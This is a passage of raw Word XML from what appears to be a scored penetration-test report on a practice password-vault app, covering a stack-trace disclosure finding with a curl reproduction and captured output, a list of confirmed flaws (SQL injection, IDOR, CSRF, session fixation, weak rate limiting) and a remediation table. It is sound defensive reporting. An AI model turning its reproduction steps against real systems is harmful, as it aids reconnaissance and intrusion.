        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Attack Surface Mapping:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Helps attackers understand the complete technology stack for targeted attacks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5.3 (Medium)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Implement Custom Error Handling:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   app.use((err, req, res, next) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">     console.error(err.stack); // Log internally</w:t>
        <w:br/>
        <w:t xml:space="preserve">     res.status(400).json({ success: false, message: "Invalid request format" });</w:t>
        <w:br/>
        <w:t xml:space="preserve">   });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Disable Stack Traces in Production:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   process.env.NODE_ENV = 'production';</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Error Handling Middleware:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>helmet.js for security headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Custom error pages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Input Validation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Validate JSON structure before parsing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Use safe JSON parsing libraries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Send a POST request to /login or /register with malformed JSON, e.g., missing quote in password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Use curl or Burp to send the request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Observe the HTTP 400 response containing full stack trace.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inspect the response body for exposed paths like /usr/app/node_modules/, Express version, etc.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Screenshot 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Terminal showing curl command, malformed JSON request, HTTP 400 response with full stack trace, and exposed internal paths (/usr/app/node_modules/body-parser/lib/types/json.js)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"test","password"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 400 Bad Request</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE html&gt;</w:t>
        <w:br/>
        <w:t>&lt;html lang="en"&gt;</w:t>
        <w:br/>
        <w:t>&lt;head&gt;</w:t>
        <w:br/>
        <w:t>&lt;meta charset="utf-8"&gt;</w:t>
        <w:br/>
        <w:t>&lt;title&gt;Error&lt;/title&gt;</w:t>
        <w:br/>
        <w:t>&lt;/head&gt;</w:t>
        <w:br/>
        <w:t>&lt;body&gt;</w:t>
        <w:br/>
        <w:t>&lt;pre&gt;SyntaxError: Unexpected token } in JSON at position 29&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at parse (/usr/app/node_modules/body-parser/lib/types/json.js:92:19)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /usr/app/node_modules/body-parser/lib/read.js:128:18&lt;br&gt; &amp;nbsp; &amp;nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)&lt;br&gt; &amp;nbsp; &amp;nbsp;at invokeCallback (/usr/app/node_modules/raw-body/index.js:238:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at done (/usr/app/node_modules/raw-body/index.js:227:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.onEnd (/usr/app/node_modules/raw-body/index.js:287:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.emit (node:events:517:28)&lt;br&gt; &amp;nbsp; &amp;nbsp;at endReadableNT (node:internal/streams/readable:1368:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at process.processTicksToRejections (node:internal/process/task_queues:21:7)&lt;/pre&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># Exposed Information:</w:t>
        <w:br/>
        <w:t># - Internal path: /usr/app/node_modules/body-parser/lib/types/json.js</w:t>
        <w:br/>
        <w:t># - Technology: Node.js, Express, body-parser</w:t>
        <w:br/>
        <w:t># - Error details: Full stack trace with line numbers</w:t>
        <w:br/>
        <w:t># - File structure: /usr/app/ application root</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Testing Coverage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Tested</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /register - SQL Injection confirmed (Finding 1, 25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /vault/add - SQL Injection confirmed (Finding 2, 25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ PUT /vault/edit/:itemId - IDOR confirmed (Finding 3, 25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ DELETE /vault/delete/:itemId - IDOR confirmed (Finding 3, 25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ GET /vault - Session fixation confirmed (Finding 4, 25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /login - Weak rate limiting confirmed (Finding 6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /vault/unlock - Weak rate limiting confirmed (Finding 6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /account/update - CSRF confirmed (Finding 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /account/update - Weak password validation confirmed (Finding 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ GET / - Missing security headers confirmed (Finding 8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /login - Cleartext password submission confirmed (Finding 9)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /vault/add - Input validation weakness confirmed (Finding 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ POST /login - Information disclosure confirmed (Finding 11)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Findings Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Critical Findings:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4 (75 points total)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 1: SQL Injection - Registration (25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 2: SQL Injection - Vault Add (25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 3: IDOR - Vault Edit/Delete (25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 4: Broken Authentication - Session Fixation (25 points)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>High Priority Findings:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 5: CSRF - Account Update</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 6: Rate Limiting - Login &amp; Vault Unlock</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Medium Priority Findings:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 7: Weak Password Validation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 8: Missing Security Headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 9: Cleartext Password Submission</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 10: Lack of Input Validation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 11: Information Disclosure - Error Messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Attack Vectors Tested</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ SQL Injection (Boolean, UNION, Blind)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ IDOR/BOLA (Edit and Delete endpoints)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ CSRF (Account update endpoint)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Brute Force (Login and vault unlock)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Rate Limiting (Login and vault unlock endpoints)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Session Fixation (Login and vault access)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Weak Password Validation (Account and vault passwords)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Missing Security Headers (All endpoints)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Information Disclosure (Error messages and stack traces)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Input Validation (Vault items)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Tools Used</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>curl (HTTP requests and header analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite (Web proxy, request interception, intruder)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ffuf (Brute force attacks)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Browser DevTools (Client-side analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wireshark (Network traffic analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Tools and Environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Testing Environment:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Target: FailSafe v2023 (http://10.0.0.10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OS: Linux (Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Browser: Firefox 140.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Network: VPN-connected to test environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>curl (HTTP requests)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Burp Suite (Web proxy, scanning)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQLMap (SQL injection detection)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Browser DevTools (Client-side analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation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Finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Impact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Points</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>1. SQL Injection (Registration)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>2. SQL Injection (Vault Add)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>3. IDOR (Vault Edit/Delete)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>4. Broken Authentication (Session Fixation)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>5. CSRF (Account Update)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Reportable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>6. Weak Rate Limiting (Login &amp; Vault)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Reportable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>7. Weak Password Validation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>8. Missing Security Headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
